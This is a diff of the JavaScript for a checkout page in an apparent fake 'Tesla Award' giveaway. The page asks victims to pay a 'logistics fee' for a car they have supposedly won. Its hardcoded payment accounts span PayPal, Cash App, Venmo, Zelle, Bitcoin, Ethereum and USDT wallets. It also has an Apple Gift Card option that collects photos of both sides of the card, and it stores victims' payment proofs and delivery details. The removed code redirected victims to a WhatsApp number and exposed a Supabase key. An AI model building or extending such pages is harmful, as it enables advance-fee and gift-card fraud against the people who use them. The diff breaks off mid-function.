@@ -370,217 +370,535 @@
 
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
-<script src="js/payment-methods.js"></script>
 <script>
 (function() {
-  "use strict";
+  'use strict';
 
-  var PM = window.TeslaPaymentMethods;
-  if (!PM) { document.body.innerHTML = '<h1 style="text-align:center;padding:60px;">Error: Payment Methods module not loaded.</h1>'; return; }
+  // ── LOAD ORDER DATA ──
+  var selectedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+  var deliveryDetails = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+  var deliveryMethod = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
+  var sessionToken = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
 
-  var S = 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/';
-  var V = {
-    cybertruck: { id:'cybertruck', name:'Cybertruck', price:'$71,985', img: S+'cybertruck-main.png' },
-    modely:     { id:'modely',     name:'Model Y',     price:'$41,380', img: S+'modely-main.png' },
-    models:     { id:'models',     name:'Model S',     price:'$111,380',img: S+'models-main.png' },
-    model3:     { id:'model3',     name:'Model 3',     price:'$38,380', img: S+'model3-main.png' },
-    modelx:     { id:'modelx',     name:'Model X',     price:'$116,380',img: S+'modelx-main.png' }
-  };
+  if (!selectedCar || !deliveryDetails || !deliveryMethod) {
+    window.location.href = 'dashboard.html';
+    return;
+  }
 
-  var sc = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
-  var sd = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
-  var sm = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
-  var st = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
-
-  if (!sc || !sd || !sm) { window.location.href = 'dashboard.html'; return; }
-
-  var PR = '15814783495';
-  try {
-    var A = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
-    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/\D/g,''); }).catch(function(){});
-  } catch(_e) {}
-
-  document.getElementById('smModel').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
-  document.getElementById('smMethod').textContent = sm ? sm.name : '—';
-  document.getElementById('smTime').textContent = sm ? sm.days : '—';
-  document.getElementById('smName').textContent = sd ? (sd.fullName || '—') : '—';
-  document.getElementById('smAddr').textContent = sd ? (sd.address || '—') : '—';
-  document.getElementById('smCity').textContent = sd ? (sd.city || '—') : '—';
-  document.getElementById('smCountry').textContent = sd ? (sd.country || '—') : '—';
-  document.getElementById('smPhone').textContent = sd ? (sd.phone || '—') : '—';
-  document.getElementById('smTotal').textContent = sm ? sm.priceDisplay : '—';
-  document.getElementById('carMiniName').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
-  document.getElementById('carMiniPrice').textContent = sc ? (sc.price || '') : '—';
-
-  var vi = V[sc.id] || null;
-  var im = document.getElementById('carMiniImg');
-  if (vi && vi.img) { im.src = vi.img; im.style.display = ''; }
-  else if (sc.img) { im.src = sc.img; im.style.display = ''; }
-
+  // ── PAYMENT METHODS ──
+  var paymentMethods = [];
   var selectedPaymentId = null;
-  var uploadedProofData = null;
+  var uploadedFileData = null;
+  var uploadedFileName = '';
 
-  function renderPaymentMethods(methods) {
+  function loadPaymentMethods() {
+    var saved = localStorage.getItem('tesla_payment_methods');
+    if (saved) {
+      try { paymentMethods = JSON.parse(saved); } catch(e) {}
+    }
+    // Fallback defaults
+    if (!paymentMethods || paymentMethods.length === 0) {
+      paymentMethods = [
+        { id:'paypal', name:'paypal', display_name:'PayPal', type:'wallet', logo_id:'pay-paypal', enabled:true, sort_order:1, account_email:'payments@teslaaward.com', business_name:'Tesla Award Program', payment_instructions:'Send payment via PayPal to payments@teslaaward.com. Include your Order ID in the payment notes.' },
+        { id:'cashapp', name:'cashapp', display_name:'Cash App', type:'wallet', logo_id:'pay-cashapp', enabled:true, sort_order:2, cash_tag:'$TeslaAward', account_name:'Tesla Award Program', payment_instructions:'Send payment to $TeslaAward on Cash App. Include your Order ID.' },
+        { id:'venmo', name:'venmo', display_name:'Venmo', type:'wallet', logo_id:'pay-venmo', enabled:true, sort_order:3, username:'@TeslaAward', account_name:'Tesla Award Program', payment_instructions:'Send payment to @TeslaAward on Venmo. Include your Order ID.' },
+        { id:'zelle', name:'zelle', display_name:'Zelle', type:'wallet', logo_id:'pay-zelle', enabled:true, sort_order:4, recipient_name:'Tesla Award Program', email:'payments@teslaaward.com', payment_instructions:'Send payment via Zelle to payments@teslaaward.com. Include your Order ID in the memo.' },
+        { id:'bitcoin', name:'bitcoin', display_name:'Bitcoin (BTC)', type:'crypto', logo_id:'pay-bitcoin', enabled:true, sort_order:5, wallet_address:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', network:'Bitcoin', payment_instructions:'Send BTC to the wallet address shown. Network fees may apply.' },
+        { id:'ethereum', name:'ethereum', display_name:'Ethereum (ETH)', type:'crypto', logo_id:'pay-ethereum', enabled:true, sort_order:6, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', network:'Ethereum (ERC-20)', payment_instructions:'Send ETH to the wallet address shown. Ensure you use the Ethereum network.' },
+        { id:'usdt-erc20', name:'usdt-erc20', display_name:'USDT (ERC-20)', type:'crypto', logo_id:'pay-usdt', enabled:true, sort_order:7, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', network:'Ethereum (ERC-20)', payment_instructions:'Send USDT (ERC-20) to the wallet address shown.' },
+        { id:'usdt-trc20', name:'usdt-trc20', display_name:'USDT (TRC-20)', type:'crypto', logo_id:'pay-usdt-trc20', enabled:true, sort_order:8, wallet_address:'TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL', network:'Tron (TRC-20)', payment_instructions:'Send USDT (TRC-20) to the wallet address shown.' },
+        { id:'creditcard', name:'creditcard', display_name:'Credit Card', type:'card', logo_id:'pay-creditcard', enabled:true, sort_order:9, accepted_networks:['visa','mastercard','amex','discover'], payment_instructions:'Pay securely using your credit or debit card. We accept Visa, Mastercard, American Express, and Discover.' },
+        { id:'applegift', name:'applegift', display_name:'Apple Gift Card', type:'gift', logo_id:'pay-applegift', enabled:true, sort_order:10, require_front:true, require_back:true, allow_camera:true, min_value:'10', payment_instructions:'Send your Apple Gift Card code by uploading images of the front and back of the card.' }
+      ];
+      localStorage.setItem('tesla_payment_methods', JSON.stringify(paymentMethods));
+    }
+    renderPaymentMethods();
+    renderOrderSummary();
+  }
+
+  function renderPaymentMethods() {
     var list = document.getElementById('paymentMethodsList');
     if (!list) return;
-    var enabled = methods || PM.getEnabled();
-    if (!enabled || enabled.length === 0) {
-      list.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:20px;color:#999;">No payment methods available.</div>';
-      return;
-    }
+    var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
     list.innerHTML = enabled.map(function(pm) {
+      var logoId = pm.logo_id || 'pay-creditcard';
+      var name = pm.display_name || pm.displayName || pm.name || 'Payment';
       var isSelected = selectedPaymentId === pm.id;
-      var safeId = escAttr(pm.id);
-      var displayName = pm.display_name || pm.name || 'Payment';
-      return '<button type="button" class="pay-card' + (isSelected ? ' selected' : '') + '" data-payment-id="' + safeId + '" id="pay-' + safeId + '">'
-        + '<div class="pay-logo" style="background:transparent;width:auto;height:36px;display:flex;align-items:center;">' + _renderPayLogo(pm) + '</div>'
-        + '<div class="pay-info"><div class="pay-name">' + esc(displayName) + '</div><div class="pay-desc">' + esc(pm.account_details || pm.description || '') + '</div></div>'
-        + '<div class="pay-check" id="pcheck-' + safeId + '">✓</div>'
-        + '</button>';
+      return '<div class="other-method-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + pm.id + '\')">' +
+        '<div class="om-icon"><svg width="36" height="36" viewBox="0 0 24 24"><use href="assets/payment-logos.svg#' + logoId + '"/></svg></div>' +
+        '<div class="om-name">' + escapeHtml(name) + '</div>' +
+        (isSelected ? '<div class="om-badge selected-badge" style="background:#E31937;color:#fff;display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:999px;margin-top:4px;">Selected</div>' : '') +
+        '</div>';
     }).join('');
-    list.querySelectorAll('[data-payment-id]').forEach(function(card) {
-      card.addEventListener('click', function() { selectPayment(this.getAttribute('data-payment-id')); });
-    });
   }
-  function _renderPayLogo(pm) {
-    var logo = pm.logo || pm.logo_url || '';
-    if (!logo && PM && PM.logos) { logo = PM.logos[pm.name || pm.id || ''] || ''; }
-    if (!logo) return '<span style="font-size:26px;line-height:1;">' + (pm.icon_emoji || '💳') + '</span>';
-    if (logo.startsWith('data:image')) return '<img src="' + escAttr(logo) + '" style="max-height:34px;max-width:120px;object-fit:contain;" alt="' + escAttr(pm.display_name || pm.name || '') + '">';
-    if (logo.indexOf('<svg') !== -1) return logo;
-    return '<span style="font-size:26px;line-height:1;">' + (pm.icon_emoji || '💳') + '</span>';
-  }
-  function selectPayment(id) {
+
+  function selectPaymentMethod(id) {
     selectedPaymentId = id;
     renderPaymentMethods();
-    showPaymentDetail(id);
+    showPaymentDetails(id);
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && uploadedFileData) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
   }
-  function showPaymentDetail(id) {
-    var pm = PM.get(id);
+
+  function showPaymentDetails(id) {
+    var pm = paymentMethods.find(function(p) { return p.id === id; });
     if (!pm) return;
+
     var section = document.getElementById('paymentDetailSection');
-    if (!section) return;
     section.style.display = 'block';
-    var cfg = pm.config || {};
-    document.getElementById('pmDetailTitle').textContent = pm.display_name || pm.name || 'Payment';
-    document.getElementById('pmDetailType').textContent = pm.category || pm.type || 'payment';
+    section.style.animation = 'slideInUp 0.3s ease';
+
+    var name = pm.display_name || pm.displayName || pm.name || 'Payment';
+    var logoId = pm.logo_id || 'pay-creditcard';
+    var type = pm.type || 'wallet';
+    var address = '';
+    if (type === 'crypto') {
+      address = pm.wallet_address || pm.walletAddress || '';
+    } else if (type === 'wallet') {
+      address = pm.account_email || pm.email || pm.cash_tag || pm.username || pm.phone || '';
+    }
+    var instructions = pm.payment_instructions || pm.instructions || '';
+
+    document.getElementById('pmDetailTitle').textContent = name;
+    document.getElementById('pmDetailType').textContent = type.charAt(0).toUpperCase() + type.slice(1);
+
     var iconEl = document.getElementById('pmBigIcon');
-    iconEl.innerHTML = _renderPayLogo(pm);
+    iconEl.innerHTML = '<svg width="32" height="32" viewBox="0 0 24 24"><use href="assets/payment-logos.svg#' + logoId + '"/></svg>';
     iconEl.className = 'pay-big-icon';
+
     var addrBox = document.getElementById('walletAddressBox');
     var addrEl = document.getElementById('walletAddress');
-    var address = pm.wallet_address || cfg.walletAddress || cfg.email || cfg.cashtag || cfg.username || cfg.phone || '';
-    if (address) { addrBox.style.display = 'block'; addrEl.textContent = address; }
-    else { addrBox.style.display = 'none'; }
-    var qrC = document.getElementById('qrContainer');
-    var qrSrc = pm.qr_code_url || cfg.qrCode || '';
-    if (qrSrc) { qrC.style.display = 'block'; document.getElementById('qrPlaceholder').innerHTML = '<img src="' + escAttr(qrSrc) + '" alt="QR Code" style="max-width:200px;border-radius:10px;">'; }
-    else { qrC.style.display = 'none'; }
-    document.getElementById('paymentInstructions').textContent = pm.payment_instructions || cfg.instructions || 'Send the exact delivery fee amount. Include your Order ID in the payment reference.';
-    var agUpload = document.getElementById('appleGiftUpload');
-    if (agUpload) agUpload.style.display = (pm.id === 'applegift' || pm.name === 'applegift') ? 'block' : 'none';
+    if (address) {
+      addrBox.style.display = 'block';
+      addrEl.textContent = address;
+    } else {
+      addrBox.style.display = 'none';
+    }
+
+    var qrContainer = document.getElementById('qrContainer');
+    var qrPlaceholder = document.getElementById('qrPlaceholder');
+    if (address && type !== 'card' && type !== 'gift') {
+      qrContainer.style.display = 'block';
+      qrPlaceholder.innerHTML = '<div style="width:160px;height:160px;background:#f8f9fa;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;border:2px dashed var(--pay-border);font-size:48px;color:#ccc;"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21,15 16,10 5,21"/></svg></div>';
+    } else {
+      qrContainer.style.display = 'none';
+    }
+
+    var instrEl = document.getElementById('paymentInstructions');
+    instrEl.textContent = instructions || 'Send the exact delivery fee amount. Include your Order ID in the payment reference.';
+
+    // Scroll to detail section
+    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
   }
 
-  // Pay button
-  var _isProcessing = false;
-  window.processPayment = function() {
-    if (_isProcessing) return;
-    if (!selectedPaymentId) {
-      if (typeof showToast === 'function') showToast('Please select a payment method.', 'error');
+  function copyAddress() {
+    var addr = document.getElementById('walletAddress').textContent;
+    if (!addr || addr === '—') return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(addr).then(function() {
+        var btn = document.getElementById('copyAddressBtn');
+        btn.textContent = '✓ Copied!';
+        btn.classList.add('copied');
+        setTimeout(function() { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+      }).catch(function() { fallbackCopy(addr); });
+    } else {
+      fallbackCopy(addr);
+    }
+  }
+
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); showToast('Address copied!'); } catch(e) { showToast('Could not copy', 'error'); }
+    document.body.removeChild(ta);
+  }
+
+  function renderOrderSummary() {
+    var fee = deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299');
+    document.getElementById('smModel').textContent = 'Tesla ' + (selectedCar.name || '');
+    document.getElementById('smMethod').textContent = deliveryMethod.name || 'Standard Delivery';
+    document.getElementById('smTime').textContent = deliveryMethod.days || '5–10 business days';
+    document.getElementById('smName').textContent = deliveryDetails.fullName || '—';
+    document.getElementById('smAddr').textContent = [deliveryDetails.address, deliveryDetails.city, deliveryDetails.state, deliveryDetails.zipCode].filter(Boolean).join(', ') || '—';
+    document.getElementById('smPhone').textContent = deliveryDetails.phone || '—';
+    document.getElementById('smTotal').textContent = fee;
+  }
+
+  // ── FILE UPLOAD ──
+  // ── HANDLE FILE SELECT (with error recovery) ──
+  function handleFileSelect(input) {
+    if (!input || !input.files) return;
+    var file = input.files[0];
+    if (!file) return;
+    processFile(file);
+    if (input) input.value = '';
+  }
+
+  function processFile(file) {
+    if (!file.type.startsWith('image/')) {
+      showToast('Please select an image file (JPEG, PNG, etc.)', 'error');
       return;
     }
-    if (!st) st = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
-
-    _isProcessing = true;
-    var btn = document.getElementById('payBtn');
-    btn.disabled = true;
-    btn.style.opacity = '0.55';
-    btn.style.cursor = 'not-allowed';
-    btn.textContent = 'Processing...';
-    if (typeof showLoading === 'function') showLoading('Processing your order...');
-
-    var pm = PM.get(selectedPaymentId);
-    var payMethodName = pm ? pm.name : 'Payment';
-
-    var payload = { sessionToken: st, selectedCar: sc, deliveryDetails: sd, deliveryMethod: sm, paymentMethod: { id: selectedPaymentId, name: payMethodName } };
-
-    var doApiCall = (typeof apiCall === 'function') ? apiCall : function(e, m, b) {
-      m = m || 'POST';
-      var B = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
-      return fetch(B + e, { method: m, headers: { 'Content-Type': 'application/json' }, body: b ? JSON.stringify(b) : null }).then(function(r) {
-        return (r.headers.get('content-type')||'').includes('application/json') ? r.json() : r.text().then(function(d) { return typeof d === 'string' ? JSON.parse(d) : d; });
-      }).then(function(d) { if (!d || d.error) throw new Error(d.error || 'Order failed'); return d; });
-    };
-
-    doApiCall('/order', 'POST', payload).then(function(r) {
-      var ord = r.order || {};
-      localStorage.setItem('tesla_last_order', JSON.stringify(ord));
-      if (ord.selectedCar) localStorage.setItem('tesla_selected_car', JSON.stringify(ord.selectedCar));
-      if (ord.deliveryDetails) localStorage.setItem('tesla_delivery_details', JSON.stringify(ord.deliveryDetails));
-      if (ord.deliveryMethod) localStorage.setItem('tesla_delivery_method', JSON.stringify(ord.deliveryMethod));
-      var oid = ord.orderId || 'N/A';
-      var trk = ord.trackingNumber || 'N/A';
-      var nm = (ord.deliveryDetails && ord.deliveryDetails.fullName) || 'N/A';
-      var mdl = (ord.selectedCar && ord.selectedCar.name) ? 'Tesla ' + ord.selectedCar.name : 'N/A';
-      var adr = ord.deliveryDetails ? [ord.deliveryDetails.address, ord.deliveryDetails.city, ord.deliveryDetails.state, ord.deliveryDetails.zipCode, ord.deliveryDetails.country].filter(Boolean).join(', ') : 'N/A';
-      var feeVal = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? ord.deliveryMethod.price : 'Pending';
-      var fee = (typeof feeVal === 'number') ? ('$' + feeVal) : feeVal;
-      var msg = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*\n\n'
-        + '\u2022 *Order ID:* ' + oid + '\n'
-        + '\u2022 *Tracking Number:* ' + trk + '\n'
-        + '\u2022 *Customer Name:* ' + nm + '\n'
-        + '\u2022 *Tesla Model:* ' + mdl + '\n'
-        + '\u2022 *Delivery Address:* ' + adr + '\n'
-        + '\u2022 *Delivery Method:* ' + (sm ? sm.name : 'N/A') + ' (' + fee + ' Logistics Fee)\n'
-        + '\u2022 *Payment Method:* ' + payMethodName + '\n'
-        + '\u2022 *Total Logistics Fee Due:* ' + fee + '\n\n'
-        + 'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + fee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
-      try { var overlay = document.getElementById('globalLoader'); if (overlay) overlay.remove(); } catch(e) {}
-      window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg);
-    }).catch(function(e) {
-      _isProcessing = false;
-      var btn2 = document.getElementById('payBtn');
-      if (btn2) { btn2.disabled = false; btn2.style.opacity = '1'; btn2.style.cursor = 'pointer'; btn2.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' — Place Order'; }
-      try { var overlay2 = document.getElementById('globalLoader'); if (overlay2) overlay2.remove(); } catch(e2) {}
-      if (typeof showToast === 'function') showToast(e.message || 'Order failed. Please try again.', 'error');
-    });
-  };
-
-  function esc(s) { if (!s) return '—'; var d = document.createElement('div'); d.textContent = String(s); return d.innerHTML; }
-  function esc(s) { if (!s) return '—'; var d = document.createElement('div'); d.textContent = String(s); return d.innerHTML; }
-  function escAttr(s) { if (!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;'); }
-
-  // Init: render immediately from localStorage/defaults, then refresh from Supabase
-  (function initPaymentMethods() {
-    var SURL = 'https://puebwzumwqizgbmksrpq.supabase.co';
-    var SKEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMxNzk1MDAsImV4cCI6MjA5ODc1NTUwMH0.SRRbUf5LL90p9pFZJRA6u62PXp4pTdU38LHALBeRiec';
-    try { renderPaymentMethods(); } catch(e) {
-      try { if (PM && PM.reset) PM.reset(); renderPaymentMethods(); } catch(e2) {
-        var list = document.getElementById('paymentMethodsList');
-        if (list) list.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:20px;color:#999;">Unable to load payment methods. Please refresh.</div>';
-      }
+    if (file.size > 10 * 1024 * 1024) {
+      showToast('File is too large. Maximum size is 10MB.', 'error');
+      return;
     }
-    fetch(SURL + '/rest/v1/payment_methods?enabled=eq.true&order=sort_order.asc', {
-      headers: { 'apikey': SKEY, 'Authorization': 'Bearer ' + SKEY }
-    }).then(function(r) {
-      if (!r.ok) throw new Error('failed');
-      return r.json();
-    }).then(function(dbMethods) {
-      if (!Array.isArray(dbMethods) || dbMethods.length === 0) return;
-      var mapped = dbMethods.map(function(m) {
-        return { id:m.name, name:m.name, display_name:m.display_name, type:m.type, category:m.type,
-          enabled:m.enabled, displayOrder:m.sort_order, sort_order:m.sort_order,
-          logo:m.logo_url||'', logo_url:m.logo_url||'', icon_emoji:m.icon_emoji||'💳',
-          wallet_address:m.wallet_address||'', account_details:m.account_details||'',
-          payment_instructions:m.payment_instructions||'', qr_code_url:m.qr_code_url||'',
-          description:m.account_details||'',
-          config:{ walletAddress:m.wallet_address||'', instructions:m.payment_instructions||'',
-            qrCode:m.qr_code_url||'', email:m.wallet_address||'', accountName:m.account_details||'' } };
-      });
-      try { if (PM && PM.save) PM.save(mapped); } catch(err) {}
-      renderPaymentMethods(mapped);
-    }).catch(function() {});
-  })();
+
+    uploadedFileName = file.name;
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      uploadedFileData = e.target.result;
+      showPreview(uploadedFileData, file.name, file.size);
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function showPreview(dataUrl, name, size) {
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'none';
+    preview.classList.add('show');
+    preview.style.display = 'block';
+
+    document.getElementById('previewImage').src = dataUrl;
+    document.getElementById('previewFileName').textContent = name || 'Receipt';
+    document.getElementById('previewFileSize').textContent = size ? formatSize(size) : '';
+
+    // Enable submit button if payment method is selected
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function resetUpload() {
+    uploadedFileData = null;
+    uploadedFileName = '';
+    var uploadState = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    uploadState.style.display = 'block';
+    preview.classList.remove('show');
+    preview.style.display = 'none';
+
+    var submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '.5';
+    submitBtn.style.cursor = 'not-allowed';
+  }
+
+  function openCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      // Fallback to file picker with camera
+      var cameraInput = document.getElementById('cameraInput');
+      if (cameraInput) cameraInput.click();
+      return;
+    }
+    // Try using the capture attribute approach
+    var cameraInput = document.getElementById('cameraInput');
+    if (cameraInput) cameraInput.click();
+  }
+
+  function formatSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+  }
+
+  function confirmUpload() {
+    if (!uploadedFileData) { showToast('No file selected', 'error'); return; }
+    showUploadStatus('✅ Payment proof uploaded successfully!', 'success');
+    showToast('Proof uploaded — you can now complete your order');
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn && selectedPaymentId) {
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = '1';
+      submitBtn.style.cursor = 'pointer';
+    }
+  }
+
+  function showUploadStatus(msg, type) {
+    var status = document.getElementById('uploadStatus');
+    status.style.display = 'block';
+    status.textContent = msg;
+    status.style.background = type === 'success' ? 'rgba(0,165,80,.08)' : 'rgba(239,68,68,.08)';
+    status.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)';
+    status.style.border = '1px solid ' + (type === 'success' ? 'rgba(0,165,80,.2)' : 'rgba(239,68,68,.2)');
+  }
+
+  // ── SUBMIT ──
+  function submitPayment() {
+    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
+    if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
+
+    var pm = paymentMethods.find(function(p) { return p.id === selectedPaymentId; });
+    var pmName = pm ? (pm.display_name || pm.displayName || pm.name || selectedPaymentId) : selectedPaymentId;
+
+    // Save payment proof to localStorage
+    var proofs = [];
+    try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+    var proof = {
+      id: 'proof_' + Date.now(),
+      user_id: 'customer',
+      order_id: 'TSLA-' + Date.now().toString(36).toUpperCase(),
+      payment_method: pmName,
+      proof_url: uploadedFileData,
+      proof_type: 'image',
+      amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+      status: 'pending',
+      created_at: new Date().toISOString()
+    };
+    proofs.unshift(proof);
+    localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+
+    // Save as last order
+    var orderData = {
+      orderId: proof.order_id,
+      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+      email: deliveryDetails.email || '',
+      entryId: 'entry_' + Date.now(),
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: selectedPaymentId, name: pmName },
+      status: 'awaiting_payment_confirmation',
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod.days || '5–10 business days'
+    };
+    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
+
+    // Try API call if available
+    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE)
+      ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
+
+    if (API_BASE) {
+      // Submit to API (best effort)
+      var controller = new AbortController();
+      var timeout = setTimeout(function() { controller.abort(); }, 10000);
+      fetch(API_BASE + '/order', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionToken: sessionToken,
+          selectedCar: selectedCar,
+          deliveryDetails: deliveryDetails,
+          deliveryMethod: deliveryMethod,
+          paymentMethod: { id: selectedPaymentId, name: pmName }
+        })
+      }).then(function(r) { return r.json(); }).then(function(r) {
+        if (r.order) {
+          localStorage.setItem('tesla_last_order', JSON.stringify(r.order));
+        }
+      }).catch(function() {}).finally(function() { clearTimeout(timeout); });
+
+      // Also submit payment proof
+      fetch(API_BASE + '/admin/payment-proofs/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(proof)
+      }).catch(function() {});
+    }
+
+    // Redirect to order confirmation
+    window.location.href = 'order-placed.html';
+  }
+
+  // ── HELPERS ──
+  function escapeHtml(str) {
+    if (str == null) return '';
+    var d = document.createElement('div');
+    d.textContent = String(str);
+    return d.innerHTML;
+  }
+
+  function showToast(msg, type) {
+    type = type || 'success';
+    if (typeof window.showToast === 'function') {
+      window.showToast(msg, type);
+      return;
+    }
+    var existing = document.querySelectorAll('.toast-notif');
+    for (var i = 0; i < existing.length; i++) existing[i].remove();
+    var t = document.createElement('div');
+    t.className = 'toast-notif toast-' + type;
+    var icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
+    t.innerHTML = '<span class="toast-icon">' + (icons[type] || '✓') + '</span><span class="toast-msg">' + msg + '</span>';
+    t.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;align-items:center;gap:12px;padding:14px 22px;border-radius:12px;font-size:14px;font-weight:500;max-width:380px;box-shadow:0 12px 40px rgba(0,0,0,.2);animation:slideInRight .35s ease;color:white;background:' + (type === 'error' ? '#EF4444' : type === 'warning' ? '#F59E0B' : '#171A20') + ';';
+    document.body.appendChild(t);
+    setTimeout(function() { t.style.opacity = '0'; t.style.transform = 'translateX(20px)'; t.style.transition = 'opacity .35s ease, transform .35s ease'; setTimeout(function() { if (t.parentNode) t.remove(); }, 350); }, 5000);
+  }
+
+  // ── APPLE GIFT CARD UPLOAD ──
+  var giftFrontData = null;
+  var giftBackData = null;
+
+  function handleGiftFile(input, side) {
+    var file = input.files && input.files[0];
+    if (!file) return;
+    if (!file.type.startsWith('image/')) { showToast('Please select an image file', 'error'); return; }
+    if (file.size > 10 * 1024 * 1024) { showToast('File too large (max 10MB)', 'error'); return; }
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      var dataUrl = e.target.result;
+      if (side === 'front') { giftFrontData = dataUrl; } else { giftBackData = dataUrl; }
+      showGiftPreview(side, dataUrl, file.name);
+    };
+    reader.readAsDataURL(file);
+    input.value = '';
+  }
+
+  function showGiftPreview(side, dataUrl, fileName) {
+    var previewEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Preview');
+    var stateEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'State');
+    if (!previewEl || !stateEl) return;
+    stateEl.style.display = 'none';
+    previewEl.style.display = 'block';
+    previewEl.innerHTML = '<img src="' + dataUrl + '" alt="' + side + ' of gift card" style="max-width:100%;max-height:140px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);"><div class="file-name" style="font-size:12px;margin-top:6px;">' + escapeHtml(fileName) + ' ✓</div>';
+    var uploadBox = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Upload');
+    if (uploadBox) uploadBox.classList.add('has-file');
+    updateGiftStatus();
+  }
+
+  function updateGiftStatus() {
+    var statusEl = document.getElementById('giftUploadStatus');
+    if (!statusEl) return;
+    if (giftFrontData && giftBackData) {
+      statusEl.innerHTML = '<span style="color:var(--success);">✓ Both front and back images uploaded — ready to submit</span>';
+      if (uploadedFileData) {
+        var submitBtn = document.getElementById('submitBtn');
+        if (submitBtn && selectedPaymentId) { submitBtn.disabled = false; submitBtn.style.opacity = '1'; submitBtn.style.cursor = 'pointer'; }
+      }
